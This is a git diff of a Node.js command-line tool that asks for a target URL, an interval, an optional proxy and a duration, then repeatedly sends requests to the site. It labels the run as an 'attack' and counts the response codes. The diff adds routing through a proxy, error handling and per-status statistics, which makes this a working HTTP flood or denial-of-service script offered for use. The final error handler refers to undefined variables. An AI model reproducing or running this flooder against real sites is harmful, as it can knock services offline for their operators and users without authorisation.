@@ -1,5 +1,6 @@
-const prompt = require('prompt-sync')({sigint: true});
+const prompt = require('prompt-sync')({sigint: true}) 
 const {HttpsProxyAgent} = require("https-proxy-agent")
+const fs = require("fs")
 
 function cs(color) {
     const colors = {
@@ -10,17 +11,17 @@ function cs(color) {
         magenta: "95",
         yellow: "93",
         blue: "94"
-    };
-    return "\x1b[" + (colors?.[color] ?? "0") + "m";
+    } 
+    return "\x1b[" + (colors?.[color] ?? "0") + "m" 
 }
 
 function nl() {
     console.log()
 }
 
-process.stdout.write('\u001b[2J\u001b[H'); 
+process.stdout.write('\u001b[2J\u001b[H')  
 
-(async() => {
+const start = (async() => {
     const interval = parseInt( prompt(`${cs("red")}Set interval (default: 20) ${cs("green")} `))  || 20
     console.log(`${cs("magenta")}${interval}${cs("reset")}`)
 
@@ -29,8 +30,8 @@ process.stdout.write('\u001b[2J\u001b[H');
     console.log(`${cs("magenta")}${site}${cs("reset")}`)
 
     const proxyPrompt = prompt(`${cs("red")}Set proxy, include port (default: None) ${cs("green")}`) || null
-    const proxy = proxyPrompt ? `${proxyPrompt.startsWith("https://") ? "" : "https://"}${proxyPrompt}` : null
-    console.log(`${cs("magenta")}${proxy ? proxy : "None"}${cs("reset")}`)
+    const proxy = proxyPrompt ? `${proxyPrompt.startsWith("http://") ? "" : "http://"}${proxyPrompt}` : null
+    console.log(`${cs("magenta")}${proxy ? proxy : "None"}${cs("yellow")}${proxy ? " ! PROXY MAY NOT WORK !" : ""}`)
 
     const length = parseFloat(prompt(`${cs("red")}Set length in seconds (default: 60)${cs("green")} `)) || 60
 
@@ -42,7 +43,6 @@ process.stdout.write('\u001b[2J\u001b[H');
     
 
     console.clear()
-    const agent = new HttpsProxyAgent(proxy || "https://1.1.1.1:80") //proxy is never used if theres no proxy set, so random value
     console.log(`${cs("yellow")}! TESTING SITE AND PROXY ! ${cs("reset")}`)
 
     nl()
@@ -50,7 +50,7 @@ process.stdout.write('\u001b[2J\u001b[H');
     let testRes
 
     try {
-        testRes = await fetch(site, proxy ? { agent } : {})
+        testRes = await fetch(site, proxy ? { agent: new HttpsProxyAgent(proxy), signal: AbortSignal.timeout(9999999) } : {signal: AbortSignal.timeout(9999999)})
     } catch(e) {
         console.log(`${cs("red")}! FATAL FETCH ERROR, CHECK CONF: ${e} !${cs("reset")}`)
         process.exit(1)
@@ -64,40 +64,70 @@ process.stdout.write('\u001b[2J\u001b[H');
             process.exit(0)
         }
     }
-    console.log(`${cs("green")}GET ${cs("magenta")}${site} ${cs("yellow")}${testRes.status} ${testRes.statusText} ${cs("red")}Proxy: ${proxy ? proxy : "None"}\n\n${cs("blue")}${(await testRes.text()).slice(0,50)}...\n\n`)
+
+    const text = await testRes.text()
+    fs.writeFileSync("./test-response.txt", text)
+    console.log(`${cs("green")}GET ${cs("magenta")}${site} ${cs("yellow")}${testRes.status} ${testRes.statusText} ${cs("red")}Proxy: ${proxy ? proxy : "None"}\n\n${cs("blue")}${text.slice(0,100)}...\n\n`)
     
     console.log(`${cs("green")}! Starting attack...`)
     console.log("Stop at any moment with Ctrl+C.")
     setTimeout(()=>{
         console.clear()
-        const startTime = new Date().getTime()
+        const startTime = Date.now()
         let requests = 0
-        const pendingRequests = new Set();
+        const pendingRequests = new Set()
 
-        const newInterval = setInterval(()=>{
-            let lastReq = new Date().getTime()
-            requests += 1
+        const stats = {}
 
-            const fetchPromise = fetch(site, proxy ? { agent } : {}).then(res=>{
-                const lapsed = new Date().getTime() - lastReq
-                
-                const seconds = Math.floor((Date.now() - startTime) / 1000);
-                const minutes = Math.floor(seconds / 60);
-                const remainingSeconds = seconds % 60;
-                const timeString = `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
+        const newInterval = setInterval(() => {
+        const fetchStart = Date.now()
+        const fetchPromise = fetch(site, proxy ? { agent: new HttpsProxyAgent(proxy) } : {})
+            .then(res => {
+                requests += 1
+                const lapsed = Date.now() - fetchStart
+                const seconds = Math.floor((Date.now() - startTime) / 1000)
+                const minutes = Math.floor(seconds / 60) 
+                const remainingSeconds = seconds % 60 
+                const timeString = `${minutes}:${remainingSeconds.toString().padStart(2, "0")}` 
 
-                
-                console.log(`${res.ok ? cs("reset") : cs("red")}${res.status}, ${timeString}, ${cs("reset")}${requests} requests, ${lapsed}ms`)
+                console.log(`${res.ok ? cs("reset") : cs("red")}${res.status}${cs("reset")}, ${timeString}, ${requests} requests, ${lapsed}ms`)
+
+                stats[res.status] = (stats[res.status] ?? 0) + 1
+
+                return res 
             })
-            pendingRequests.add(fetchPromise)
-        }, interval)
-        
-        setTimeout(async()=>{
-            clearInterval(newInterval)
-            await Promise.all(pendingRequests)
-            console.log(`${cs("green")}Attack complete!\n${requests} requests in ${length} seconds.${cs("reset")}`)
-        }, length*1000)
-    }, 3500)
+            .catch(err => {
+                const lapsed = Date.now() - fetchStart 
+                console.error(`${cs("red")}Fetch error:`, err?.code ?? err.message ?? err, `— ${lapsed}ms${cs("reset")}`) 
+                return null 
+            })
+            .finally(() => {
+                pendingRequests.delete(fetchPromise) 
+            }) 
 
-    
-})()
+        pendingRequests.add(fetchPromise) 
+        }, interval) 
+
+
+        setTimeout(async () => {
+            try {
+                clearInterval(newInterval) 
+                const snapshot = Array.from(pendingRequests) 
+                await Promise.allSettled(snapshot)
+
+                const statsText = Object.entries(stats).map(([status, count]) => `${cs("green")}Code ${status === "200" ? "" : cs("red")}${status}${cs("reset")}: ${cs("yellow")}${count} requests`).join("\n");
+
+                console.log(`${cs("green")}Attack complete!\n${requests} requests in ${length} seconds.\n${statsText}${cs("reset")}`) 
+            } catch (err) {
+                console.error("Finalization error:", err) 
+            }
+        }, length * 1000) 
+        
+    }, 3500)
+})
+
+try {
+    start()
+} catch (e) {
+    console.log(`${cs("red")} FATAL ERROR OCCURED: \n${cs(reset)}${c}`)
+}
